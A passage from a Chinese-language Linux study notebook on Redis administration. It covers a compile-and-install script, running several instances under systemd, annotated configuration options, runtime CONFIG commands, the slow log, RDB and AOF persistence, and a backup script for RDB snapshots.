    fi
    cd ${SRC_DIR}
    tar xf ${REDIS_FILE}
    REDIS_DIR=`echo ${REDIS_FILE} | sed -nr 's/^(.*[0-9]).*/\1/p'`
    cd ${REDIS_DIR}
    if [ ${VERSION} == "6" ] ;then
        make -j ${CPUS} USE_SYSTEMD=yes PREFIX=${INSTALL_DIR} install && ${COLOR}"Redis 编译安装完成"${END} || { ${COLOR}"Redis 编译安装失败"${END};exit ; }
    else
        make -j ${CPUS} PREFIX=${INSTALL_DIR} install && ${COLOR}"Redis 编译安装完成"${END} || { ${COLOR}"Redis 编译安装失败"${END};exit ; }
    fi
    ln -s ${INSTALL_DIR}/bin/redis-*  /usr/bin/
    mkdir -p ${INSTALL_DIR}/{etc,log,data,run}
    cp redis.conf  ${INSTALL_DIR}/etc/
    sed -i -e 's/bind 127.0.0.1.*/bind 0.0.0.0/'  -e "/# requirepass/a requirepass ${PASSWORD}"  -e "/^dir .*/c dir ${INSTALL_DIR}/data/"  -e "/logfile .*/c logfile ${INSTALL_DIR}/log/redis-6379.log"  -e  "/^pidfile .*/c  pidfile ${INSTALL_DIR}/run/redis_6379.pid" ${INSTALL_DIR}/etc/redis.conf

    if id redis &> /dev/null ;then
        ${COLOR}"Redis 用户已存在"${END}
    else
        useradd -r -s /sbin/nologin redis
        ${COLOR}"Redis 用户创建成功"${END}
    fi

    chown -R redis.redis ${INSTALL_DIR}
    cat >> /etc/sysctl.conf <<-EOF
net.core.somaxconn = 1024
vm.overcommit_memory = 1
EOF
    sysctl -p
    if [ ${OS_ID} == "CentOS" ] &> /dev/null;then
        echo 'echo never > /sys/kernel/mm/transparent_hugepage/enabled' >> /etc/rc.d/rc.local
        chmod +x /etc/rc.d/rc.local
    else
        cat >> /lib/systemd/system/rc-local.service <<-EOF

[Install]
WantedBy=multi-user.target
EOF
        echo '#!/bin/bash' > /etc/rc.local
        echo 'echo never > /sys/kernel/mm/transparent_hugepage/enabled' >> /etc/rc.local
        chmod +x /etc/rc.local
    fi
    
    cat > /lib/systemd/system/redis.service <<-EOF
[Unit]
Description=Redis persistent key-value database
After=network.target

[Service]
ExecStart=${INSTALL_DIR}/bin/redis-server ${INSTALL_DIR}/etc/redis.conf --supervised systemd
ExecReload=/bin/kill -s HUP \$MAINPID
ExecStop=/bin/kill -s QUIT \$MAINPID
Type=notify
User=redis
Group=redis
RuntimeDirectory=redis
RuntimeDirectoryMode=0755

[Install]
WantedBy=multi-user.target
EOF
    systemctl daemon-reload
    systemctl enable --now  redis &> /dev/null 
    systemctl is-active redis &> /dev/null && ${COLOR}"Redis 服务启动成功,Redis信息如下:"${END} || { ${COLOR}"Redis 启动失败"${END};exit; }
    redis-cli -a ${PASSWORD} info server 2> /dev/null
    ${COLOR}"亲亲~Redis安装完成"${END}
}

main(){
    os
    check_file
    install
}

main
```

![1657684203812](linux体系.assets/1657684203812.png)

#### 45.3.5 Redis的多实例

```
#1.概述
测试环境中经常使用多实例,需要指定不同实例的相应的端口,配置文件,日志文件等相关配置




2.#范例: 以编译安装为例实现 redis 多实例

#2.1生成redis_6379实例
[root@pxc2 ~]# cd /apps/redis/etc/
[root@pxc2 etc]# cp redis.conf redis_6379.conf
[root@pxc2 etc]# sed -i 's/dbfilename dump.rdb/dbfilename dump_6379.rdb/' redis_6379.conf

[root@pxc2 etc]# cp  /lib/systemd/system/redis.service /lib/systemd/system/redis6379.service
#修改service文件
[root@pxc2 etc]# cat  /lib/systemd/system/redis6379.service
[Unit]
Description=Redis persistent key-value database
After=network.target

[Service]
ExecStart=/apps/redis/bin/redis-server /apps/redis/etc/redis_6379.conf --supervised systemd  #修改这一行
ExecReload=/bin/kill -s HUP $MAINPID
ExecStop=/bin/kill -s QUIT $MAINPID
Type=notify
User=redis
Group=redis
RuntimeDirectory=redis
RuntimeDirectoryMode=0755

[Install]
WantedBy=multi-user.target








#2.2生成redis_6380实例
[root@pxc2 etc]# cp redis_6379.conf redis_6380.conf
[root@pxc2 etc]# sed -i 's/dbfilename dump_6379.rdb/dbfilename dump_6380.rdb/' redis_6380.conf
[root@pxc2 etc]# sed -i 's/redis-6379.log/redis-6380.log/' redis_6380.conf
[root@pxc2 etc]# sed -i 's/redis_6379.pid/redis_6380.pid/' redis_6380.conf
[root@pxc2 etc]# cp  /lib/systemd/system/redis.service /lib/systemd/system/redis6380.service
[root@pxc2 etc]# sed -i 's/port 6379/port 6380/' redis_6380.conf

#修改service文件
[root@pxc2 etc]# cat  /lib/systemd/system/redis6380.service
[Unit]
Description=Redis persistent key-value database
After=network.target

[Service]
ExecStart=/apps/redis/bin/redis-server /apps/redis/etc/redis_6380.conf --supervised systemd  #修改这一行
ExecReload=/bin/kill -s HUP $MAINPID
ExecStop=/bin/kill -s QUIT $MAINPID
Type=notify
User=redis
Group=redis
RuntimeDirectory=redis
RuntimeDirectoryMode=0755

[Install]
WantedBy=multi-user.target




#2.3生成redis_6381实例
[root@pxc2 etc]# cp redis_6379.conf redis_6381.conf
[root@pxc2 etc]# sed -i 's/dbfilename dump_6379.rdb/dbfilename dump_6381.rdb/' redis_6381.conf
[root@pxc2 etc]# sed -i 's/redis-6379.log/redis-6381.log/' redis_6381.conf
[root@pxc2 etc]# sed -i 's/redis_6379.pid/redis_6381.pid/' redis_6381.conf
[root@pxc2 etc]# cp  /lib/systemd/system/redis.service /lib/systemd/system/redis6381.service
[root@pxc2 etc]# sed -i 's/port 6379/port 6381/' redis_6381.conf

#修改service文件
[root@pxc2 etc]# cat  /lib/systemd/system/redis6381.service
[Unit]
Description=Redis persistent key-value database
After=network.target

[Service]
ExecStart=/apps/redis/bin/redis-server /apps/redis/etc/redis_6381.conf --supervised systemd  #修改这一行
ExecReload=/bin/kill -s HUP $MAINPID
ExecStop=/bin/kill -s QUIT $MAINPID
Type=notify
User=redis
Group=redis
RuntimeDirectory=redis
RuntimeDirectoryMode=0755

[Install]
WantedBy=multi-user.target




#2.4查看修改是否正确
[root@pxc2 etc]# grep "^dbfilename" redis_6379.conf 
dbfilename dump_6379.rdb
[root@pxc2 etc]# grep "^dbfilename" redis_6380.conf 
dbfilename dump_6380.rdb
[root@pxc2 etc]# grep "^dbfilename" redis_6381.conf 
dbfilename dump_6381.rdb





#3.使多实例生效
[root@pxc2 etc]# systemctl stop redis
[root@pxc2 etc]# systemctl daemon-reload
[root@pxc2 etc]# systemctl restart redis6379.service redis6380.service redis6381.service




#4.远程连接三个实例
[root@centos8 ~]# redis-cli -h 10.0.0.17 -p 6379 -a 123456 info
[root@centos8 ~]# redis-cli -h 10.0.0.17 -p 6380 -a 123456 info
[root@centos8 ~]# redis-cli -h 10.0.0.17 -p 6381 -a 123456 info





#5.最终生成的文件列表
[root@pxc2 etc]# tree /apps/redis/
/apps/redis/
├── bin
│   ├── redis-benchmark
│   ├── redis-check-aof -> redis-server
│   ├── redis-check-rdb -> redis-server
│   ├── redis-cli
│   ├── redis-sentinel -> redis-server
│   └── redis-server
├── data
│   ├── dump_6379.rdb
│   ├── dump_6380.rdb
│   └── dump_6381.rdb
├── etc
│   ├── redis_6379.conf
│   ├── redis_6380.conf
│   ├── redis_6381.conf
│   └── redis.conf
├── log
│   ├── redis-6379.log
│   ├── redis-6380.log
│   └── redis-6381.log
└── run
    ├── redis_6379.pid
    ├── redis_6380.pid
    └── redis_6381.pid

5 directories, 19 files
```

#### 45.3.6 Redis配置和优化

##### 45.3.6.1  redis主要配置项

```
bind 0.0.0.0 #监听地址，可以用空格隔开后多个监听IP

protected-mode yes #redis3.2之后加入的新特性，在没有设置bind IP和密码的时候,redis只允许访问127.0.0.1:6379，可以远程连接，但当访问将提示警告信息并拒绝远程访问

port 6379 #监听端口,默认6379/tcp

tcp-backlog 511 #三次握手的时候server端收到client ack确认号之后的队列值，即全连接队列长度timeout 0	#客户端和Redis服务端的连接超时时间，默认是0，表示永不超时
tcp-keepalive 300 #tcp 会话保持时间300s

daemonize no #默认no,即直接运行redis-server程序时,不作为守护进程运行，而是以前台方式运行， 如果想在后台运行需改成yes,当redis作为守护进程运行的时候，它会写一个pid 到/var/run/redis.pid 文件

supervised no #和OS相关参数，可设置通过upstart和systemd管理Redis守护进程，centos7后都使用systemd

pidfile /var/run/redis_6379.pid #pid文件路径,可以修改为/apps/redis/run/redis_6379.pid

loglevel notice #日志级别

logfile "/path/redis.log" #日志路径,示例:logfile "/apps/redis/log/redis_6379.log" databases 16 #设置数据库数量，默认：0-15，共16个库
always-show-logo yes #在启动redis 时是否显示或在日志中记录记录redis的logo

save 900 1 #在900秒内有1个key内容发生更改,就执行快照机制
save 300 10 #在300秒内有10个key内容发生更改,就执行快照机制
save 60 10000	#60秒内如果有10000个key以上的变化，就自动快照备份

stop-writes-on-bgsave-error yes #默认为yes时,可能会因空间满等原因快照无法保存出错时，会禁止redis写入操作，生产建议为no
#此项只针对配置文件中的自动save有效


rdbcompression yes #持久化到RDB文件时，是否压缩，"yes"为压缩，"no"则反之rdbchecksum yes #是否对备份文件开启RC64校验，默认是开启
dbfilename dump.rdb #快照文件名

dir ./ #快照文件保存路径，示例：dir "/apps/redis/data"

#主从复制相关
# replicaof <masterip> <masterport>	#指定复制的master主机地址和端口，5.0版之前的指令为slaveof
# masterauth <master-password> #指定复制的master主机的密码

replica-serve-stale-data yes #当从库同主库失去连接或者复制正在进行，从机库有两种运行方式：
1、设置为yes(默认设置)，从库会继续响应客户端的读请求，此为建议值
2、设置为no，除去特定命令外的任何请求都会返回一个错误"SYNC with master in progress"。

replica-read-only yes #是否设置从库只读，建议值为yes,否则主库同步从库时可能会覆盖数据，造成数据丢失

repl-diskless-sync no #是否使用socket方式复制数据(无盘同步)，新slave第一次连接master时需要做数据的全量同步，redis  server就要从内存dump出新的RDB文件，然后从master传到slave，有两种方式把RDB文件传输给客户端：
1、基于硬盘（disk-backed）：为no时，master创建一个新进程dump生成RDB磁盘文件，RDB完成之后由  父进程（即主进程）将RDB文件发送给slaves，此为默认值
2、基于socket（diskless）：master创建一个新进程直接dump  RDB至slave的网络socket，不经过主进程和硬盘
#推荐使用基于硬盘（为no），是因为RDB文件创建后，可以同时传输给更多的slave，但是基于socket(为
yes)， 新slave连接到master之后得逐个同步数据。只有当磁盘I/O较慢且网络较快时，可用
diskless(yes),否则一般建议使用磁盘(no)

repl-diskless-sync-delay 5 #diskless时复制的服务器等待的延迟时间，设置0为关闭，在延迟时间内到达的客户端，会一起通过diskless方式同步数据，但是一旦复制开始，master节点不会再接收新slave  的复制请求，直到下一次同步开始才再接收新请求。即无法为延迟时间后到达的新副本提供服务，新副本将排   队等待下一次RDB传输，因此服务器会等待一段时间才能让更多副本到达。推荐值：30-60

repl-ping-replica-period 10 #slave根据master指定的时间进行周期性的PING master,用于监测
master状态,默认10s
repl-timeout 60 #复制连接的超时时间，需要大于repl-ping-slave-period，否则会经常报超时repl-disable-tcp-nodelay no #是否在slave套接字发送SYNC之后禁用 TCP_NODELAY，如果选
择"yes"，Redis将合并多个报文为一个大的报文，从而使用更少数量的包向slaves发送数据，但是将使数  据传输到slave上有延迟，Linux内核的默认配置会达到40毫秒，如果 "no" ，数据传输到slave的延迟将会减少，但要使用更多的带宽

repl-backlog-size 512mb #复制缓冲区内存大小，当slave断开连接一段时间后，该缓冲区会累积复制副本数据，因此当slave  重新连接时，通常不需要完全重新同步，只需传递在副本中的断开连接后没有同步的部分数据即可。只有在至少有一个slave连接之后才分配此内存空间,建议建立主从时此值要调大一些或在   低峰期配置,否则会导致同步到slave失败

repl-backlog-ttl 3600 #多长时间内master没有slave连接，就清空backlog缓冲区

replica-priority 100 #当master不可用，哨兵Sentinel会根据slave的优先级选举一个master，此值最低的slave会优先当选master，而配置成0，永远不会被选举，一般多个slave都设为一样的值，让其自动选择

#min-replicas-to-write 3	#至少有3个可连接的slave，mater才接受写操作
#min-replicas-max-lag 10	#和上面至少3个slave的ping延迟不能超过10秒，否则master也将停止 写操作

requirepass foobared #设置redis连接密码，之后需要AUTH pass,如果有特殊符号，用" "引起来,生产建议设置

rename-command #重命名一些高危命令，示例：rename-command FLUSHALL "" 禁用命令
#示例: rename-command del magedu maxclients 10000 #Redis最大连接客户端
maxmemory <bytes> #redis使用的最大内存，单位为bytes字节，0为不限制，建议设为物理内存一半，
8G内存的计算方式8(G)*1024(MB)1024(KB)*1024(Kbyte)，需要注意的是缓冲区是不计算在maxmemory内,生产中如果不设置此项,可能会导致OOM

appendonly no #是否开启AOF日志记录，默认redis使用的是rdb方式持久化，这种方式在许多应用中已经足够用了，但是redis如果中途宕机，会导致可能有几分钟的数据丢失(取决于dump数据的间隔时间)，根  据save来策略进行持久化，Append Only File是另一种持久化方式，可以提供更好的持久化特性，Redis 会把每次写入的数据在接收后都写入 appendonly.aof 文件，每次启动时Redis都会先把这个文件的数据读入内存里，先忽略RDB文件。默认不启用此功能

appendfilename "appendonly.aof" #文本文件AOF的文件名，存放在dir指令指定的目录中appendfsync everysec #aof持久化策略的配置
#no表示由操作系统保证数据同步到磁盘,Linux的默认fsync策略是30秒，最多会丢失30s的数据
#always表示每次写入都执行fsync，以保证数据同步到磁盘,安全性高,性能较差
#everysec表示每秒执行一次fsync，可能会导致丢失这1s数据,此为默认值,也生产建议值

#同时在执行bgrewriteaof操作和主进程写aof文件的操作，两者都会操作磁盘，而bgrewriteaof往往会  涉及大量磁盘操作，这样就会造成主进程在写aof文件的时候出现阻塞的情形,以下参数实现控制no-appendfsync-on-rewrite no #在aof rewrite期间,是否对aof新记录的append暂缓使用文件同步策略,主要考虑磁盘IO开支和请求阻塞时间。
#默认为no,表示"不暂缓",新的aof记录仍然会被立即同步到磁盘，是最安全的方式，不会丢失数据，但是要 忍受阻塞的问题
#为yes,相当于将appendfsync设置为no，这说明并没有执行磁盘操作，只是写入了缓冲区，因此这样并不会造成阻塞（因为没有竞争磁盘），但是如果这个时候redis挂掉，就会丢失数据。丢失多少数据呢？Linux  的默认fsync策略是30秒，最多会丢失30s的数据,但由于yes性能较好而且会避免出现阻塞因此比较推荐

#rewrite 即对aof文件进行整理,将空闲空间回收,从而可以减少恢复数据时间

auto-aof-rewrite-percentage 100 #当Aof log增长超过指定百分比例时，重写AOF文件，设置为0(数据变成原先的一倍的时候，触发重写)
表示不自动重写Aof日志，重写是为了使aof体积保持最小，但是还可以确保保存最完整的数据

auto-aof-rewrite-min-size 64mb #触发aof rewrite的最小文件大小

aof-load-truncated yes #是否加载由于某些原因导致的末尾异常的AOF文件(主进程被kill/断电等)，建议yes

aof-use-rdb-preamble no #redis4.0新增RDB-AOF混合持久化格式，在开启了这个功能之后，AOF重写产生的文件将同时包含RDB格式的内容和AOF格式的内容，其中RDB格式的内容用于记录已有的数据，而AOF  格式的内容则用于记录最近发生了变化的数据，这样Redis就可以同时兼有RDB持久化和AOF持久化的优点
（既能够快速地生成重写文件，也能够在出现问题时，快速地载入数据）,默认为no,即不启用此功能

lua-time-limit 5000 #lua脚本的最大执行时间，单位为毫秒cluster-enabled yes #是否开启集群模式，默认不开启,即单机模式

cluster-config-file nodes-6379.conf #由node节点自动生成的集群配置文件名称

cluster-node-timeout 15000 #集群中node节点连接超时时间，单位ms,超过此时间，会踢出集群

cluster-replica-validity-factor 10 #单位为次,在执行故障转移的时候可能有些节点和master断开一段时间导致数据比较旧，这些节点就不适用于选举为master，超过这个时间的就不会被进行故障转移,不  能当选master，计算公式：(node-timeout * replica-validity-factor) + repl-ping- replica-period

cluster-migration-barrier 1 #集群迁移屏障，一个主节点至少拥有1个正常工作的从节点，即如果主节点的slave节点故障后会将多余的从节点分配到当前主节点成为其新的从节点。

cluster-require-full-coverage yes #集群请求槽位全部覆盖，如果一个主库宕机且没有备库就会出现集群槽位不全，那么yes时redis集群槽位验证不全,就不再对外提供服务(对key赋值时,会出现CLUSTERDOWN The cluster is down的提示,cluster_state:fail,但ping 仍PONG)，而no则可以继续使用,但是会出现查询数据查不到的情况(因为有数据丢失)。生产建议为no

cluster-replica-no-failover no #如果为yes,此选项阻止在主服务器发生故障时尝试对其主服务器进行故障转移。 但是，主服务器仍然可以执行手动强制故障转移，一般为no

#Slow log 是 Redis 用来记录超过指定执行时间的日志系统，执行时间不包括与客户端交谈，发送回复等I/O操作，而是实际执行命令所需的时间（在该阶段线程被阻塞并且不能同时为其它请求提供服务）,由于 slow log 保存在内存里面，读写速度非常快，因此可放心地使用，不必担心因为开启 slow log 而影响Redis 的速度

slowlog-log-slower-than 10000 #以微秒为单位的慢日志记录，为负数会禁用慢日志，为0会记录每个命令操作。默认值为10ms,一般一条命令执行都在微秒级,生产建议设为1ms-10ms之间

slowlog-max-len 128 #最多记录多少条慢日志的保存队列长度，达到此长度后，记录新命令会将最旧的命令从命令队列中删除，以此滚动删除,即,先进先出,队列固定长度,默认128,值偏小,生产建议设为1000以上
```

##### 45.3.6.2 CONFIG动态修改配置

```
#1.概述
config 命令用于查看当前redis配置、以及不重启redis服务实现动态更改redis配置等
注意：不是所有配置都可以动态修改,且此方式无法持久保存

CONFIG SET parameter value
时间复杂度：O(1)
CONFIG SET 命令可以动态地调整 Redis 服务器的配置(configuration)而无须重启。

你可以使用它修改配置参数，或者改变Redis的持久化(Persistence)方式。
CONFIG SET 可以修改的配置参数可以使用命令 CONFIG GET * 来列出，所有被 CONFIG SET 修改的配置参数都会立即生效。

CONFIG GET parameter
时间复杂度： O(N)，其中 N 为命令返回的配置选项数量。
CONFIG GET 命令用于取得运行中的 Redis 服务器的配置参数(configuration parameters)，在Redis 2.4 版本中， 有部分参数没有办法用 CONFIG GET 访问，但是在最新的 Redis 2.6 版本中，所有配置参数都已经可以用CONFIG GET 访问了。

CONFIG GET 接受单个参数 parameter 作为搜索关键字，查找所有匹配的配置参数，其中参数和值以“键-值对”(key-value pairs)的方式排列。
比如执行 CONFIG GET s* 命令，服务器就会返回所有以 s 开头的配置参数及参数的值：





#2.案例：
#设置连接密码
[root@centos8 ~]# redis-cli -h 10.0.0.17 -p 6379 -a 123456
127.0.0.1:6379> CONFIG SET requirepass 123456
OK

#查看连接密码
127.0.0.1:6379> CONFIG GET requirepass  
1) "requirepass"
2) "123456"

#设置端口号
10.0.0.17:6379> config set port 6666
OK

#查看端口号
10.0.0.17:6379> config get port
1) "port"
2) "6666"


#查看bind 
127.0.0.1:6379> CONFIG GET bind
1) "bind"
2) "0.0.0.0"

#修改bind
127.0.0.1:6379> CONFIG SET bind 127.0.0.1
(error) ERR Unsupported CONFIG parameter: bind

#设置最大内存
127.0.0.1:6379> CONFIG SET maxmemory 8589934592
OK

#查看最大内存
127.0.0.1:6379> CONFIG GET maxmemory
1) "maxmemory"
2) "8589934592"
```

##### 45.3.6.3 慢查询

![1657707092562](linux体系.assets/1657707092562.png)

```
#设置慢查询相关配置
[root@pxc2 etc]# vim /apps/redis/etc/redis_6379.conf
slowlog-log-slower-than 1   #时间超过1s认为是慢
slowlog-max-len 1024     #最多记录多少条慢日志


127.0.0.1:6379> SLOWLOG LEN  #查看慢日志的记录条数
(integer) 14
127.0.0.1:6379> SLOWLOG GET [n] #查看慢日志的n条记录
1) 1) (integer) 14
2) (integer) 1544690617
3) (integer) 4 4) 1) "slowlog"
127.0.0.1:6379> SLOWLOG GET 3 1) 1) (integer) 7
   2) (integer) 1602901545
   3) (integer) 26
   4) 1) "SLOWLOG"
      2) "get"
   5) "127.0.0.1:38258"
   6) ""
2) 1) (integer) 6
   2) (integer) 1602901540
   3) (integer) 22
   4) 1) "SLOWLOG"
      2) "get"
      3) "2"
   5) "127.0.0.1:38258"
   6) ""
3) 1) (integer) 5
   2) (integer) 1602901497
   3) (integer) 22
   4) 1) "SLOWLOG"
      2) "GET"
       5) "127.0.0.1:38258"
   6) ""
127.0.0.1:6379> SLOWLOG RESET #清空慢日志
OK
```

#### 45.3.7 Redis持久化

```
Redis 虽然是一个内存级别的缓存程序，也就是redis 是使用内存进行数据的缓存的，但是其可以将内存的数据按照一定的策略保存到硬盘上，从而实现数据持久保存的目的。

目前redis支持两种不同方式的数据持久化保存机制，分别是RDB和AOF
```

![1657708111602](linux体系.assets/1657708111602.png)



##### 45.3.7.1 RDB模式

**RDB 模式工作原理**

![1657708330825](linux体系.assets/1657708330825.png)

```
RDB(Redis DataBase)：基于时间的快照，其默认只保留当前最新的一次快照，特点是执行速度比较快，缺点是可能会丢失从上次快照到当前时间点之间未做快照的数据
```

**RDB bgsave 实现快照的具体过程:**

![1657708540079](linux体系.assets/1657708540079.png)

```
Redis从master主进程先fork出一个子进程，使用写时复制机制，子进程将内存的数据保存为一个临时文件，比如:tmp-.rdb，当数据保存完成之后再将上一次保存的RDB文件替换掉，然后关闭子进程，这样可以保证每一次做RDB快照保存的数据都是完整的。

因为直接替换RDB文件的时候,可能会出现突然断电等问题,而导致RDB文件还没有保存完整就因为突然关机停止保存,而导致数据丢失的情况.后续可以手动将每次生成的RDB文件进行备份，这样可以最大化保存历史数据。
```

![1657708654816](linux体系.assets/1657708654816.png)

**实现RDB方式**

```
[root@pxc2 ~]# vim /apps/redis/etc/redis.conf
#下面三个条件只要有一个满足，就促发快照。
save 900 1 #在900秒内有1个key内容发生更改,就执行快照机制
save 300 10 #在300秒内有10个key内容发生更改,就执行快照机制
save 60 10000	#60秒内如果有10000个key以上的变化，就自动快照备份

save: 同步,会阻赛其它命令,不推荐使用
bgsave: 异步后台执行,不影响其它命令的执行
自动: 制定规则,自动执行
rdb存放的路径：/apps/redis/data/
```

**RDB 模式的优缺点**

```
#1.RDB模式优点
RDB快照保存了某个时间点的数据，可以通过脚本执行redis指令bgsave(非阻塞，后台执行)或者save(会阻塞写操作,不推荐)命令自定义时间点备份，可以保留多个备份，当出现问题可以恢复到不同时间点的版本,很适合备份,并且此文件格式也支持有不少第三方工具可以进行后续的数据分析。

比如: 可以在最近的24小时内，每小时备份一次RDB文件，并且在每个月的每一天，也备份一个RDB文件。这样的话，即使遇上问题，也可以随时将数据集还原到不同的版本。

RDB可以最大化Redis的性能，父进程在保存 RDB文件时唯一要做的就是fork出一个子进程，然后这个子进程就会处理接下来的所有保存工作，父进程无须执行任何磁盘I/0操作。

RDB在大量数据,比如几个G的数据，恢复的速度比AOF的快。




#2.RDB模式缺点
不能实时保存数据，可能会丢失自上一次执行RDB备份到当前的内存数据。

如果你需要尽量避免在服务器故障时丢失数据，那么RDB不适合你。虽然Redis允许你设置不同的保存点（save point）来控制保存RDB文件的频率，但是，因为ROB文件需要保存整个数据集的状态，所以它并不是一个轻松的操作。因此你可能会至少5分钟才保存一次RDB文件。在这种情况下，一旦发生故障停机，你就可能会丢失好几分钟的数据。

当数据量非常大的时候，从父进程fork子进程进行保存至RDB文件时需要一点时间，可能是毫秒或者秒，取决于磁盘IO性能。

在数据集比较庞大时，fork()可能会非常耗时，造成服务器在一定时间内停止处理客户端﹔如果数据集非常巨大，并且CPU时间非常紧张的话，那么这种停止时间甚至可能会长达整整一秒或更久。虽然 AOF重写也需要进行fork()，但无论AOF重写的执行间隔有多长，数据的持久性都不会有任何损失。
```

##### 45.3.7.2 实时监控备份RDB文件的脚本

```
#!/bin/bash
#      
#********************************************************************
#Author:        liusenbiao
#Date:          2022-07-14
#FileName：     redis_backup_rdb.sh
#Description：  实时监控备份RDB文件的脚本
#********************************************************************
. /etc/init.d/functions
BACKUP=/backup/redis-rdb
DIR=/apps/redis/data
FILE=dump_6379.rdb
PASS=123456

color () {
    RES_COL=60
    MOVE_TO_COL="echo -en \\033[${RES_COL}G"
    SETCOLOR_SUCCESS="echo -en \\033[1;32m"
    SETCOLOR_FAILURE="echo -en \\033[1;31m"
    SETCOLOR_WARNING="echo -en \\033[1;33m"
    SETCOLOR_NORMAL="echo -en \E[0m"
    echo -n "$1" && $MOVE_TO_COL
    echo -n "["
    if [ $2 = "success" -o $2 = "0" ] ;then
        ${SETCOLOR_SUCCESS}
        echo -n $"  OK  "    
    elif [ $2 = "failure" -o $2 = "1"  ] ;then
        ${SETCOLOR_FAILURE}
        echo -n $"FAILED"
    else
        ${SETCOLOR_WARNING}
        echo -n $"WARNING"
    fi
    ${SETCOLOR_NORMAL}
    echo -n "]"
    echo
}

redis-cli -h 127.0.0.1 -a $PASS --no-auth-warning  bgsave 
result=`redis-cli -a 123456 --no-auth-warning info Persistence |grep rdb_bgsave_in_progress| sed -rn 's/.*:([0-9]+).*/\1/p'`
until  [ $result -eq 0 ] ;do
    sleep 1
    result=`redis-cli -a 123456 --no-auth-warning info Persistence |grep rdb_bgsave_in_progress| sed -rn 's/.*:([0-9]+).*/\1/p'`
done
DATE=`date +%F_%H-%M-%S`

[ -e $BACKUP ] || { mkdir -p $BACKUP ; chown -R redis.redis $BACKUP; }
cp $DIR/$FILE $BACKUP/dump_6379-${DATE}.rdb

color "Backup redis RDB" 0



#查看备份文件
[root@pxc2 ~]# ll /backup/redis-rdb/
total 4
-rw-r--r-- 1 redis redis 107 Jul 13 18:21 dump_6379-2022-07-14_20-00-04.rdb
```

![1657771393432](linux体系.assets/1657771393432.png)

##### 45.3.7.3 AOF模式

![1657787824263](linux体系.assets/1657787824263.png)

**AOF 模式工作原理**

```
AOF：AppendOnylFile，按照操作顺序依次将操作追加到指定的日志文件末尾。

AOF 和 RDB一样使用了写时复制机制，AOF默认为每秒钟fsync一次，即将执行的命令保存到AOF文件当中，这样即使redis服务器发生故障的话最多只丢失1秒钟之内的数据，也可以设置不同的fsync策略always，即设置每次执行命令的时候执行fsync，fsync会在后台执行线程，所以主线程可以继续处理用户的正常请求而不受到写入AOF文件的I/O影响。

同时启用RDB和AOF,进行恢复时,默认AOF文件优先级高于RDB文件,即会使用AOF文件进行恢复。

注意: AOF模式默认是关闭的,第一次开启AOF后,并重启服务生效后,会因为AOF的优先级高于RDB,而AOF默认没有文件存在,从而导致所有数据丢失。
```

**AOF相关配置**

```
#1.相关配置
appendonly yes
appendfilename "appendonly-${port}.aof"
appendfsync everysec  #aof持久化策略配置
dir /path

#rewrite相关
no-appendfsync-on-rewrite yes
auto-aof-rewrite-percentage 100
auto-aof-rewrite-min-size 64mb
aof-load-truncated yes




#2.案例：开启AOF功能
#动态修改
[root@pxc2 ~]# redis-cli -a 123456 -p 6379 config set appendonly yes
[root@pxc2 ~]# vim /apps/redis/etc/redis_6379.conf
appendonly yes
#如果redis写错了怎么通过aof文件修改
[root@pxc2 ~]# redis-cli -a 123456 -p 6379
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
127.0.0.1:6379> get class
"m666"
127.0.0.1:6379> get class
(nil)
127.0.0.1:6379> set class m6666
OK
127.0.0.1:6379> set age 80
OK
127.0.0.1:6379> set age 8088
OK
127.0.0.1:6379> 
#删除age 8080
[root@pxc2 ~]# vim /apps/redis/data/appendonly.aof
*2
$6
SELECT
$1
0
*3
$3
set
$5
class
$5
m6666
*3
$3
set
$3
age
$2
80
*3   #删除这行向后
$3
set
$3
age
$4
8088
#改错的数据回复成功！！！
127.0.0.1:6379> get age
"80"





#3.启用AOF功能的正确方式
[root@centos8 ~]#ll /var/lib/redis/
total 314392
-rw-r--r-- 1 redis redis 187779391 Oct 17 14:23 dump.rdb
[root@centos8 ~]#redis-cli
127.0.0.1:6379> config get appendonly 
1) "appendonly"
2) "no"
127.0.0.1:6379> config set appendonly  yes  #第一步，自动触发aof重写
OK
[root@centos8 ~]#ll /var/lib/redis/
total 314392
-rw-r--r-- 1 redis redis 187779391 Oct 17 14:23 dump.rdb
-rw-r--r-- 1 redis redis  85196805 Oct 17 14:45 temp-rewriteaof-2146.aof
[root@centos8 ~]#ll /var/lib/redis/
total 366760
-rw-r--r-- 1 redis redis 187779391 Oct 17 14:45 appendonly.aof
-rw-r--r-- 1 redis redis 187779391 Oct 17 14:23 dump.rdb

[root@centos8 ~]#vim /etc/redis.conf   #第二步
appendonly yes #改为yes 

#config set appendonly yes 可以同时看到下面显示
```

##### 45.3.7.4 AOF rewrite重写

**AOF rewrite过程**

![1657791774345](linux体系.assets/1657791774345.png)

```
将一些重复的,可以合并的,过期的数据重新写入一个新的AOF文件,从而节约AOF备份占用的硬盘空间,也能加速恢复过程，可以手动执行bgrewriteaof 触发AOF,或定义自动rewrite策略。
```

**AOF 相关配置**

```
appendonly yes
appendfilename "appendonly-${port}.aof"
appendfsync everysec
dir /path
no-appendfsync-on-rewrite no
auto-aof-rewrite-percentage 100
auto-aof-rewrite-min-size 64mb  #最小64m,64m以后触发重写
aof-load-truncated yes
```

**范例: 启用AOF功能的正确方式**

```
[root@centos8 ~]#ll /var/lib/redis/
total 314392
-rw-r--r-- 1 redis redis 187779391 Oct 17 14:23 dump.rdb
[root@centos8 ~]#redis-cli
127.0.0.1:6379> config get appendonly 
1) "appendonly"
2) "no"
127.0.0.1:6379> config set appendonly  yes
OK
[root@centos8 ~]#ll /var/lib/redis/
total 314392
-rw-r--r-- 1 redis redis 187779391 Oct 17 14:23 dump.rdb
-rw-r--r-- 1 redis redis  85196805 Oct 17 14:45 temp-rewriteaof-2146.aof
[root@centos8 ~]#ll /var/lib/redis/
total 366760
-rw-r--r-- 1 redis redis 187779391 Oct 17 14:45 appendonly.aof
-rw-r--r-- 1 redis redis 187779391 Oct 17 14:23 dump.rdb

[root@centos8 ~]#vim /etc/redis.conf
appendonly yes #改为yes 

#config set appendonly yes 可以同时看到下面显示
```

![1657792653669](linux体系.assets/1657792653669.png)

**AOF 模式优缺点**

```
#1.AOF模式优点
数据安全性相对较高，根据所使用的fsync策略(fsync是同步内存中redis所有已经修改的文件到存储设备)，默认是appendfsync everysec，即每秒执行一次 fsync,在这种配置下，Redis 仍然可以保持良好的性能，并且就算发生故障停机，也最多只会丢失一秒钟的数据( fsync会在后台线程执行，所以主线程可以继续努力地处理命令请求)。

